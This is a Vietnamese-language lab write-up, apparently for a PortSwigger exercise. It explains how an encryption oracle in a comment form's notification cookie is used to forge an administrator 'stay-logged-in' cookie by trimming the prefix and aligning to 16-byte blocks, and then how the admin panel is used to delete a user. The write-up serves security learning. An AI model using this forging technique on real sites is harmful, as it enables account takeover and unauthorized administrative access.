- Trang web chứa lỗ hổng logic dẫn tới tiết lộ cơ chế mã hóa encryption oracle. Để hoàn thành bài lab, chúng ta cần khai thác lỗ hổng này và truy cập tới trang quản trị, xóa tài khoản người dùng Carlos. Tài khoản hợp lệ được sử dụng: wiener:peter.

Tại trang đăng nhập có tính năng Stay logged in, đăng nhập cùng với ghi nhớ mật khẩu:

![image](https://hackmd.io/_uploads/Hyr7ecQ36.png)

Hệ thống xác nhận tính năng ghi nhớ đăng nhập của người dùng thông qua cookie sta-logged-in:

![image](https://hackmd.io/_uploads/S1EcecQ36.png)

Mặt khác, tại mỗi bài post có chức năng comment. Và khi ta để lại một email a123 không hợp lệ như dưới:

![image](https://hackmd.io/_uploads/S1lQM5mhp.png)

![image](https://hackmd.io/_uploads/H1jZfcmh6.png)

Thì ứng dụng thông báo một dòng Invalid email address: a123 và kèm theo một cookie nofitication dạng base64. Decode ra thì thấy nó cũng bị mã hóa. Ta có thể suy luận rằng:

Nội dung của notification chính là base64 của chuỗi Invalid email address: a123 sau khi bị mã hóa
Và thuật toán mã hóa dùng cho nofitication giống với stay-logged-in.

![image](https://hackmd.io/_uploads/B1ACMcQh6.png)

### Khai thác

Ta sẽ kiểm chứng bằng cách lấy giá trị của stay-logged-in để đưa vào nofitication.

Kết quả cho thấy nội dung của stay-logged-in chính là username:timestamp.

![image](https://hackmd.io/_uploads/Hy587c72T.png)

Bây giờ, ta cần tạo một giá trị stay-logged-in cho administrator dựa vào cách mã hóa của trường notification. Và vì notification được tạo thông qua trường email nên ta sẽ truyền payload tại email. Ta sẽ truyền `administrator:<timestamp>` tại email.

![image](https://hackmd.io/_uploads/S1ZUN9mhT.png)

Có thể thấy thông báo Invalid email address: administrator:1111111111111 với notification là dạng base64 mã hóa của nó.

![image](https://hackmd.io/_uploads/BklTV973p.png)

Tuy nhiên mình cần xóa Invalid email address: (23 bytes) đi để notification chỉ chứa base64 giá trị mã hóa của administrator:1672593998338. Để làm được điều đó, lấy giá trị notification hiện tại, thực hiện decode URL+base64 và xóa 23 bytes đầu đi.

![image](https://hackmd.io/_uploads/HkrVrq73T.png)

xóa 23 bytes trên, thực hiện encode base64 + URL encode để truyền vào cookie notification

![image](https://hackmd.io/_uploads/HkvTBcQ2T.png)

Kết quả thông báo ciphertext trong notification phải là bội số 16. Mình có thể đoán thuật toán mã hóa mỗi block 16 bytes.

![image](https://hackmd.io/_uploads/SJU6ScX3T.png)

Như vậy mình cần chèn thêm 9 bytes bất kì vào trước để kết hợp với 23 bytes trên thành 32 bytes cần xóa -> xóa 32 ký tự đi thì sẽ decode được

![image](https://hackmd.io/_uploads/Bye5OcXhT.png)

![image](https://hackmd.io/_uploads/SyYiO9m3p.png)

![image](https://hackmd.io/_uploads/B1xl_57hT.png)

Đưa vào notification mình thấy đã decode ra thành công administrator:1111111111111

![image](https://hackmd.io/_uploads/Bys3c9mnp.png)

và mình có được trang admin panel

![image](https://hackmd.io/_uploads/rkpA957hp.png)

xóa carlos và mình solve được lab này

![image](https://hackmd.io/_uploads/S191oqQna.png)

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
